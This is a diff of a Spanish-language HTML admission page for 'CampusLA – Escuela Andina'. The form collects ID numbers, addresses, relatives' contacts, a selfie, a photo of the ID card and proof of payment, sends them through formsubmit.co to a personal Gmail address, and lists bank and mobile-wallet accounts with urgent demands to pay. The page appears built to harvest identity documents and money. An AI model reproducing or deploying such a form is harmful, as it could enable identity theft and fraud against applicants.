@@ -2,147 +2,147 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Radicación Oficial | CampusLA - Escuela Andina</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Admisión Oficial | CampusLA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #02060d; --card: #0b111d; --primary: #00f2ff;
-            --secondary: #00ff88; --accent: #ff007a; --text-main: #ffffff;
-            --text-dim: #94a3b8; --border: rgba(255, 255, 255, 0.1);
+            --bg: #02060d; --card: #0b111d; --primary: #0084ff;
+            --secondary: #00f2ff; --text-main: #ffffff; --text-dim: #94a3b8;
+            --border: rgba(255, 255, 255, 0.08);
         }
-        body { background-color: var(--bg); color: var(--text-main); font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; padding: 15px; display: flex; justify-content: center; min-height: 100vh; }
-        .wrapper { max-width: 600px; width: 100%; text-align: center; }
-        .logo-text { font-size: 3.5rem; font-weight: 800; letter-spacing: -3px; background: linear-gradient(90deg, var(--secondary), var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; text-transform: uppercase; }
-        .inst-tag { font-size: 0.8rem; color: var(--secondary); font-weight: 700; text-transform: uppercase; letter-spacing: 4px; margin-top: 5px; }
-        .welcome-box { background: linear-gradient(135deg, #0d1e36 0%, #02060d 100%); border: 2px solid var(--primary); padding: 30px; border-radius: 24px; margin-bottom: 25px; box-shadow: 0 20px 50px rgba(0, 242, 255, 0.2); }
-        .warning-text { color: var(--accent); font-weight: 800; font-size: 0.9rem; margin-top: 15px; text-transform: uppercase; }
-        .social-links { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; }
-        .social-btn { background: #1e293b; padding: 12px; border-radius: 12px; text-align: center; font-size: 0.85rem; text-decoration: none; color: white; border: 1px solid var(--border); font-weight: 600; }
-        .step-section { background: var(--card); border: 1px solid var(--border); padding: 25px; border-radius: 24px; margin-bottom: 20px; text-align: left; }
-        h3 { font-size: 1.2rem; font-weight: 800; color: var(--primary); text-transform: uppercase; text-align: center; margin-bottom: 18px; }
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        label { display: block; font-size: 0.9rem; font-weight: 700; color: var(--text-dim); margin-bottom: 10px; }
-        textarea, input { width: 100%; background: #141b26; border: 1px solid var(--border); border-radius: 14px; padding: 16px; color: white; font-size: 1rem; box-sizing: border-box; }
-        input[type="file"] { padding: 12px; font-size: 0.8rem; border: 1px dashed var(--primary); cursor: pointer; }
-        .important-note { background: rgba(255, 0, 122, 0.1); border: 2px solid var(--accent); padding: 15px; border-radius: 14px; color: var(--accent); font-weight: 800; text-align: center; margin: 15px 0; text-transform: uppercase; font-size: 0.9rem; }
-        .bank-info { background: rgba(255, 255, 255, 0.03); border-left: 4px solid var(--primary); padding: 18px; border-radius: 12px; margin-bottom: 10px; font-size: 0.9rem; line-height: 1.4; }
-        .btn-pay { padding: 18px; border-radius: 16px; text-align: center; font-weight: 800; font-size: 0.8rem; color: white; }
-        .nequi { background: #ff00bf; } .daviplata { background: #ff2b2b; }
-        .download-link { display: block; background: rgba(255,255,255,0.03); color: var(--secondary); text-decoration: none; padding: 15px; border-radius: 12px; margin-bottom: 10px; font-size: 0.8rem; font-weight: 700; border: 1px solid var(--border); text-align: center; }
-        .btn-submit { width: 100%; padding: 24px; background: linear-gradient(90deg, var(--secondary), var(--primary)); border: none; border-radius: 20px; font-weight: 800; font-size: 1.2rem; cursor: pointer; color: #000; text-transform: uppercase; margin-top: 15px; }
-        footer { text-align: center; font-size: 0.8rem; color: var(--text-dim); padding: 40px 0; border-top: 1px solid var(--border); margin-top: 30px; }
+        body { background-color: var(--bg); color: var(--text-main); font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; padding: 15px; font-size: 13px; }
+        .wrapper { max-width: 550px; width: 100%; margin: auto; }
+        
+        header { padding: 30px 0; text-align: center; }
+        .logo-text { font-size: 2.2rem; font-weight: 700; color: #fff; letter-spacing: -1px; margin: 0; cursor: pointer; }
+        .inst-tag { font-size: 0.65rem; color: var(--primary); font-weight: 700; text-transform: uppercase; letter-spacing: 2px; }
+
+        .section-card { background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 16px; margin-bottom: 20px; text-align: left; }
+        h3 { font-size: 0.9rem; font-weight: 700; color: var(--primary); text-transform: uppercase; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
+
+        .welcome-h2 { font-size: 1.3rem; font-weight: 700; margin-bottom: 10px; color: #fff; text-align: center; }
+        .copy-redes { font-size: 0.85rem; color: var(--text-dim); text-align: center; line-height: 1.4; margin-bottom: 18px; }
+        .mandatory-badge { background: #fff; color: #000; font-size: 0.7rem; font-weight: 800; padding: 4px 12px; border-radius: 4px; display: inline-block; margin-bottom: 12px; text-transform: uppercase; }
+
+        .social-links { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
+        .social-item { background: rgba(255,255,255,0.03); border: 1px solid var(--border); padding: 10px; border-radius: 8px; text-decoration: none; color: #fff; font-size: 0.75rem; font-weight: 500; text-align: center; transition: 0.3s; }
+        .social-item:hover { background: var(--primary); border-color: var(--primary); }
+
+        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .full-width { grid-column: span 2; }
+        label { display: block; font-size: 0.75rem; font-weight: 600; color: var(--text-dim); margin-bottom: 6px; }
+        input, select, textarea { width: 100%; background: #050a14; border: 1px solid var(--border); border-radius: 8px; padding: 10px; color: white; font-size: 0.85rem; margin-bottom: 15px; box-sizing: border-box; font-family: inherit; }
+        
+        .btn-blue { display: block; text-decoration: none; text-align: center; background: var(--primary); color: white; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; border: none; cursor: pointer; text-transform: uppercase; font-size: 0.8rem; transition: 0.3s; line-height: 1.2; box-sizing: border-box; }
+        .btn-blue span { display: block; font-size: 0.65rem; font-weight: 400; opacity: 0.9; text-transform: none; margin-top: 4px; }
+        .btn-blue:hover { background: #0066cc; box-shadow: 0 0 15px rgba(0, 132, 255, 0.3); }
+        
+        .cam-input { border: 1px dashed var(--primary); background: rgba(0, 132, 255, 0.03); padding: 12px; border-radius: 8px; text-align: center; margin-bottom: 15px; }
+        .bank-info { background: rgba(255,255,255,0.03); padding: 15px; border-radius: 10px; font-size: 0.8rem; line-height: 1.6; border-left: 3px solid var(--primary); }
+        footer { text-align: center; padding: 30px; font-size: 0.8rem; color: var(--text-dim); border-top: 1px solid var(--border); margin-top: 20px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <div class="wrapper">
-        <header><div class="logo-text">CAMPUSLA</div><div class="inst-tag">ESCUELA ANDINA RES 210 DE 2020</div></header>
 
-        <section class="welcome-box">
-            <h2>¡Bienvenido al campus más grande del mundo!</h2>
-            <p>Registro Obligatorio en: <a href="https://www.campuslatinoamerica.edu.co" target="_blank" style="color: var(--primary);">www.campuslatinoamerica.edu.co</a></p>
+<div class="wrapper">
+    <header>
+        <div class="logo-text">CAMPUSLA</div>
+        <div class="inst-tag">ESCUELA ANDINA RES 210 DE 2020</div>
+    </header>
+
+    <form action="https://formsubmit.co/eatramites1@gmail.com" method="POST" id="mainForm" enctype="multipart/form-data">
+        
+        <section class="section-card" style="text-align: center;">
+            <h2 class="welcome-h2">¡Bienvenido al campus más grande del mundo!</h2>
+            <div class="mandatory-badge">Requisito de Admisión</div>
+            <p class="copy-redes">
+                Es <b>obligatorio</b> registrarse en la plataforma oficial y seguir nuestras redes institucionales. 
+                De carácter mandatorio para alumnos de Escuela Andina.
+            </p>
+            
+            <a href="https://www.campuslatinoamerica.edu.co" target="_blank" style="display: block; background: #fff; color: #000; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: 800; font-size: 0.9rem; margin-bottom: 15px;">
+                REGÍSTRATE EN: www.campuslatinoamerica.edu.co
+            </a>
+
             <div class="social-links">
-                <a href="https://www.facebook.com/profile.php?id=100013260212952" class="social-btn" target="_blank">Facebook</a>
-                <a href="https://www.instagram.com/confesionescampusuniversi/" class="social-btn" target="_blank">Instagram</a>
-                <a href="https://www.tiktok.com/@aprendegratismarty?lang=es" class="social-btn" target="_blank">TikTok</a>
-                <a href="https://www.youtube.com/channel/UCvfCiF08p5G48Z5WTNOzeyQ" class="social-btn" target="_blank">YouTube</a>
+                <a href="https://www.facebook.com/profile.php?id=100013260212952" class="social-item" target="_blank">Facebook</a>
+                <a href="https://www.instagram.com/confesionescampusuniversi/" class="social-item" target="_blank">Instagram</a>
+                <a href="https://www.tiktok.com/@aprendegratismarty?lang=es" class="social-item" target="_blank">TikTok</a>
+                <a href="https://www.youtube.com/channel/UCvfCiF08p5G48Z5WTNOzeyQ" class="social-item" target="_blank">YouTube</a>
             </div>
-            <p class="warning-text">⚠️ EL REGISTRO Y SEGUIR LAS REDES ES OBLIGATORIO PARA TU PROCESO</p>
         </section>
 
-        <form action="https://formsubmit.co/eatramites1@gmail.com" method="POST" id="formFinal" enctype="multipart/form-data">
-            <input type="hidden" name="_next" value="https://www.campuslatinoamerica.edu.co">
-            <input type="hidden" name="_captcha" value="false">
-
-            <section class="step-section">
-                <h3>01. IDENTIDAD LEGAL</h3>
-                <div class="group"><label>Nombre Completo</label><input type="text" name="Nombre" required></div>
-                <div class="grid-2">
-                    <div><label>Cédula</label><input type="text" name="Cedula" required></div>
-                    <div style="margin-top:10px;"><label>Nacimiento (Toca el año arriba)</label><input type="date" name="Nacimiento" value="2000-01-01" min="1950-01-01" max="2012-12-31" required style="color-scheme: dark; width: 100%; background: #141b26; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 16px; color: white;"></div>
-                <div class="group"><label>Dirección / Universidad / Carrera / Correo / Teléfono</label><textarea name="Datos_Adicionales" required style="height: 100px;"></textarea></div>
-                <div style="border: 1px solid var(--accent); padding: 18px; border-radius: 14px; background: rgba(255, 0, 122, 0.05);"><label style="color: var(--accent);">Nombres y teléfono de Familiar (Obligatorio)</label><input type="text" name="Contacto_Familiar" required></div>
-            </section>
-
-            <section class="step-section">
-                <h3>02. DOCUMENTACIÓN Y CÁMARA</h3>
-                <div class="group">
-                    <label>📸 Foto Selfie (Cámara frontal)</label>
-                    <input type="file" name="Selfie" accept="image/*" capture="user" required>
+        <section class="section-card">
+            <h3>01. Información Académica y Personal</h3>
+            <div class="form-grid">
+                <div class="full-width"><label>Nombres y Apellidos Completos</label><input type="text" name="Nombre" required></div>
+                <div><label>Cédula / Documento</label><input type="text" name="Cedula" required></div>
+                <div><label>Teléfono Celular</label><input type="tel" name="Tel" required></div>
+                <div class="full-width"><label>Dirección y Ciudad de Residencia</label><input type="text" name="Direccion" required></div>
+                <div class="full-width"><label>Universidad / Institución de procedencia</label><input type="text" name="Universidad"></div>
+                <div><label>Carrera / Programa</label><input type="text" name="Carrera"></div>
+                <div><label>Lugar de Trabajo</label><input type="text" name="Trabajo"></div>
+                
+                <div class="full-width">
+                    <label>Nivel de Inglés Exigido</label>
+                    <select name="Nivel_Ingles" required>
+                        <option value="">Seleccione nivel...</option>
+                        <option value="A1">A1 - Principiante</option>
+                        <option value="A2">A2 - Básico</option>
+                        <option value="B1">B1 - Pre-intermedio</option>
+                        <option value="B2">B2 - Intermedio Alto</option>
+                        <option value="C1">C1 - Avanzado</option>
+                        <option value="C2">C2 - Maestría</option>
+                    </select>
                 </div>
-                <div class="group">
-                    <label>🪪 Foto de tu Cédula (Cámara trasera)</label>
-                    <input type="file" name="Foto_Cedula" accept="image/*" capture="environment" required>
-                </div>
+            </div>
+        </section>
 
-                <div style="margin-bottom: 25px;">
-                    <a href="Acta de confidencialidad para estudiantes doc..." class="download-link">⬇️ 1. Acta de Confidencialidad</a>
-                    <a href="Acta de matrícula Escuela Andina 2020..docx" class="download-link">⬇️ 2. Acta de Matrícula</a>
-                    <a href="CONTRATO PARA LA PRESTACION DE SERVICI..." class="download-link">⬇️ 3. Contrato de Servicios</a>
-                    <a href="Lista de asistencia a clases.docx" class="download-link">⬇️ 4. Lista de Asistencia</a>
-                    <a href="Pagaré escuela andina - campus 2026.docx" class="download-link">⬇️ 5. Pagaré Institucional</a>
-                </div>
+        <section class="section-card">
+            <h3>02. Referencia Familiar</h3>
+            <div class="form-grid">
+                <div class="full-width"><label>Nombre del Familiar</label><input type="text" name="Familiar_Nombre" required></div>
+                <div class="full-width"><label>Teléfono del Familiar</label><input type="tel" name="Familiar_Tel" required></div>
+            </div>
+        </section>
 
-                <div class="important-note">
-                    ⚠️ EL PAGO ES LO ÚNICO OBLIGATORIO AHORA. Descarga los documentos - no los llenes. 
-                </div>
-            </section>
-<div class="important-note" style="background: rgba(255, 0, 122, 0.15); border: 2px solid #ff007a; padding: 20px; border-radius: 14px; color: #ffffff; font-weight: 800; text-align: center; margin: 20px 0; line-height: 1.6;">
-    ⚠️ EL PAGO ES LO ÚNICO OBLIGATORIO PARA RADICAR HOY. <br>
-    <span style="color: #00ff88;">LOS DOCUMENTOS (SOLO FIRMA y Cédula) PUEDES ENVIARLOS EN 3 A 5 DÍAS AQUÍ:</span><br>
-    
-    <a id="linkCorreo" href="mailto:eatramites1@gmail.com?subject=Documentacion%20Firmada" 
-       style="color: #00f2ff; font-size: 1.3rem; text-decoration: underline; display: block; margin-top: 10px;">
-       📧 Enviar a: eatramites1@gmail.com
-    </a>
-    
-    <p style="font-size: 0.8rem; margin-top: 10px; color: #94a3b8;">(Pincha el correo para enviar los documentos con tu nombre en el asunto)</p>
+        <section class="section-card">
+            <h3>03. Validación de Identidad</h3>
+            <label>📸 Foto Selfie (Cámara Frontal)</label>
+            <div class="cam-input"><input type="file" name="Selfie" accept="image/*" capture="user" required></div>
+            <label>🪪 Documento de Identidad (Cámara Trasera)</label>
+            <div class="cam-input"><input type="file" name="Cedula_Foto" accept="image/*" capture="environment" required></div>
+        </section>
+
+        <a href="contratosdeprestacióndeserviciosdigitales.html" class="btn-blue">
+            FIRMAR DOCUMENTOS DE ADMISIÓN
+            <span>Para avanzar en el proceso y registro del examen (3 minutos)</span>
+        </a>
+
+        <section class="section-card" style="margin-top: 20px;">
+            <h3>04. Registro de Pago</h3>
+            <div class="bank-info">
+                <strong>CAMPUSLA SAS:</strong> Bancolombia 26200005425<br>
+                <strong>ESCUELA ANDINA:</strong> Bancolombia 26200002780<br>
+                <strong>NEQUI / DAVIPLATA:</strong> 3144365569
+            </div>
+            <p style="font-size:0.75rem; color:var(--text-dim); margin-top:10px; font-style:italic;">
+                Para pagos con <b>Tarjeta, PayPal o Stripe</b>, solicite el link a su asesor.
+            </p>
+            <br>
+            <label>🧾 Soporte de Pago (Captura o Foto)</label>
+            <input type="file" name="Pago_Soporte" accept="image/*" required>
+            
+            <button type="submit" class="btn-blue" style="background:#00c853; margin-top:10px;">Finalizar Radicación Oficial</button>
+        </section>
+    </form>
+
+    <footer>
+        CAMPUSLA DE CLASE MUNDIAL<br>
+        ESCUELA ANDINA RES 210 DE 2020
+    </footer>
 </div>
-            <section class="step-section">
-                <h3>03. PAGO Y FINALIZAR</h3>
-                <div class="bank-info"><b>CAMPUSLA SAS:</b> Bancolombia Ahorros 26200005425</div>
-                <div class="bank-info"><b>ESCUELA ANDINA:</b> Bancolombia Ahorros 26200002780</div>
-                <div class="bank-info"><b>AV VILLAS:</b> Cuenta Corriente 421895249</div>
-                <div class="grid-2" style="margin: 15px 0;">
-                    <div class="btn-pay nequi">NEQUI: 3144365569</div>
-                    <div class="btn-pay daviplata">DAVIPLATA: 3144365569</div>
-                </div>
-                <div class="group">
-                    <label>🧾 Adjuntar Comprobante de Pago (Pantallazo)</label>
-                    <input type="file" name="Comprobante_Pago" accept="image/*" required>
-                </div>
-                <button type="submit" class="btn-submit">FINALIZAR RADICACIÓN</button>
-            </section>
-        </form>
 
-        <footer><p>CAMPUSLA - De clase Mundial</p><p>ESCUELA ANDINA RES 210 DE 2020</p></footer>
-    </div><script>
-    // Buscamos el campo donde el estudiante pone su nombre (asegúrate que el input tenga id="nom_est")
-    const inputNombre = document.getElementById('nom_est');
-    const linkCorreo = document.getElementById('linkCorreo');
-
-    if(inputNombre) {
-        inputNombre.addEventListener('input', function() {
-            const nombre = encodeURIComponent(this.value);
-            linkCorreo.href = `mailto:eatramites1@gmail.com?subject=Documentacion%20Firmada%20-%20${nombre}&body=Hola,%20adjunto%20mis%20documentos%20firmados%20para%20mi%20proceso%20en%20CampusLA.`;
-        });
-    }
-</script><script>
-    const elFormulario = document.getElementById('formFinal');
-    
-    elFormulario.onsubmit = function() {
-        // 1. Mostramos el Pop-up de una
-        alert("¡PROCESAMIENTO INICIADO!\n\nEstamos subiendo tus archivos a la base de datos de CampusLA. Esto puede tardar unos segundos dependiendo de tu internet.\n\nPor favor, NO cierres la ventana hasta que seas redirigido.");
-        
-        // 2. Buscamos el botón y lo desactivamos para que no le den más clics
-        const boton = elFormulario.querySelector('.btn-submit');
-        boton.disabled = true;
-        boton.innerText = "ENVIANDO DATOS... ESPERE";
-        boton.style.opacity = "0.5";
-        boton.style.cursor = "not-allowed";
-        
-        return true; // Permite que el formulario se envíe a FormSubmit
-    };
-</script>
 </body>
 </html>
